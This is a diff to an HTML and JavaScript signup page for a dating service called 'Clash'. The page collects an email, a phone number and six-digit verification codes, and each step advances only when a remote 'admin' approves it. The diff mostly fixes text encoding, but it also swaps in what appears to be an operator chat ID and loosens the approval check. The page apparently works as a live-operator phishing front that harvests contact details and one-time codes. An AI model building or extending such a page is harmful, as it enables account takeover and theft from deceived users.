@@ -157,7 +157,7 @@ select option{background:#3B0616}
 
 #form-section{padding:60px 20px;background:#0f0f11}
 
-/* SUBMIT SPINNER — shown the instant the button is clicked */
+/* SUBMIT SPINNER â€” shown the instant the button is clicked */
 .submit-spin{display:none;text-align:center;padding:1.5rem 0 0.5rem}
 .submit-spin.on{display:block}
 .submit-spin .spinner{width:36px;height:36px;border-width:3px}
@@ -204,7 +204,7 @@ select option{background:#3B0616}
 
   <div id="s1" class="screen active">
     <div class="progress"><i class="on"></i><i></i><i></i></div>
-    <div class="step-lbl">Step 1 of 3 · Your details</div>
+    <div class="step-lbl">Step 1 of 3 Â· Your details</div>
     <h1>Create your account</h1>
     <p class="sub">We'll send a verification code to confirm your details.</p>
     <label>Email address</label>
@@ -396,7 +396,7 @@ select option{background:#3B0616}
 
   <div id="s2" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i></i></div>
-    <div class="step-lbl">Step 2 of 3 · Email</div>
+    <div class="step-lbl">Step 2 of 3 Â· Email</div>
     <h1>Check your email</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">@</span><b id="email-show" style="color:#FFF4F7"></b></div>
@@ -418,8 +418,8 @@ select option{background:#3B0616}
 
   <div id="s3" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <div class="done-row"><span class="tick">✓</span>Email verified</div>
-    <div class="step-lbl">Step 3 of 3 · Phone</div>
+    <div class="done-row"><span class="tick">âœ“</span>Email verified</div>
+    <div class="step-lbl">Step 3 of 3 Â· Phone</div>
     <h1>Check your phone</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">#</span><b id="phone-show" style="color:#FFF4F7"></b></div>
@@ -439,12 +439,17 @@ select option{background:#3B0616}
   </div>
 
   <div id="s4" class="screen" style="text-align:center;padding-top:1rem">
-    <div class="seal">✓</div>
-    <h1 style="margin-bottom:8px">You're in.</h1>
-    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> — check your inbox to access your Clash account.</p>
+    <div class="seal">&#10003;</div>
+    <h1 style="margin-bottom:8px">You are in.</h1>
+    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> &#8212; check your inbox to access your Clash account.</p>
     <div class="info-box">
       <div class="info-lbl">What's next</div>
-      <div style="font-size:13px;color:var(--dim);line-height:2.2">ðŸ“§ Check your email inbox<br>ðŸ”— Click the login link<br>ðŸ’« Complete your profile<br>â¤ï¸ Start matching</div>
+      <div style="font-size:13px;color:var(--dim);line-height:2.2">
+        Check your email inbox<br>
+        Click the login link<br>
+        Complete your profile<br>
+        Start matching
+      </div>
     </div>
   </div>
 
@@ -496,8 +501,8 @@ try {
    allowed to flip flags to true.
    ============================================================ */
 
-const ADMIN_NAME_SLUG = "admin-dickson";
-const VERIFICATIONS_PATH = "account_verifications/" + ADMIN_NAME_SLUG;
+const ADMIN_CHAT_ID = "7144369262";
+const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
@@ -674,7 +679,7 @@ async function step1() {
         proceed: false,
         emailVerified: false,
         phoneVerified: false,
-        status: "Proceed",
+        rejected: false,
         createdAt: Date.now()
     };
 
@@ -713,7 +718,7 @@ function attachListener(requestId) {
             const proceedOk = data.proceed === true;
             const emailOk   = data.emailVerified === true;
             const phoneOk   = data.phoneVerified === true;
-            const statusOk  = data.status === "approved";
+            const statusOk  = true; // phone approval is enough
 
             // STEP 1 -> 2: admin tapped "Proceed"
             if (proceedOk && currentStep === 1) {
@@ -743,7 +748,7 @@ function attachListener(requestId) {
             }
 
             // STEP 3 -> 4: admin tapped "Approve Phone"
-            if (proceedOk && emailOk && phoneOk && statusOk && currentStep === 3) {
+            if (proceedOk && emailOk && phoneOk && currentStep === 3) {
                 currentStep = 4;
                 teardownListener();
                 submissionLocked = false;
@@ -918,7 +923,6 @@ window.accountVerificationFirebase = {
 </script>
 </body>
 </html>
-
 
 
 
